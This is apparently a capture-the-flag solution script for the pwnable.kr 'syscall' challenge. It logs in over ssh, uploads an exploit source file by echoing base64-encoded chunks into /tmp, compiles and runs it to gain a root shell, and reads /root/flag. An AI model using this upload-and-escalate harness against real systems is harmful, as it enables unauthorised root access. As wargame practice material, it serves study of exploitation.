#!/usr/bin/env python3
import io
import gzip
import tarfile

from pwn import *

if args.LOCAL:
    raise Exception("not supported!")
else:
    shell = process('sshpass -p guest ssh syscall@pwnable.kr -p2222', shell=True)

# --- utils --- #
USER_DELIM = b"/ $ "
ROOT_DELIM = b"/ # "

def do_command(shell: tube, cmd: bytes, delim=USER_DELIM) -> bytes:
    shell.sendline(cmd)
    return shell.recvuntil(delim, drop=True)

def upload_file(shell: tube, filename: bytes, data: bytes):
    compressed_data = b64e(gzip.compress(gzip.compress(data)))
    compressed_filename = filename + b".compressed"

    do_command(shell, b"rm %s" % filename)

    for _ in range(0, len(compressed_data), 400):
        do_command(shell, b'echo -n "%s" >> %s' % (compressed_data[_:_+400].encode("ascii"), compressed_filename))

    do_command(shell, b"base64 -d %s | gzip -d | gzip -d > %s" % (compressed_filename, filename))

# output is sometimes out of order, this sleep + enter fixes it
shell.recvuntil(USER_DELIM)
sleep(1)
do_command(shell, b"stty -echo")

info("uploading files...")
upload_file(shell, b"/tmp/exploit.c", Path("exploit.c").read_bytes())

info("compiling exploit...")
do_command(shell, b"gcc -o /tmp/exploit /tmp/exploit.c")

info("running exploit...")
do_command(shell, b"/tmp/exploit", delim=ROOT_DELIM)

flag = do_command(shell, b"cat /root/flag", delim=ROOT_DELIM)

success(f"flag = '{term.text.bold_italic_yellow(flag.decode().strip())}'")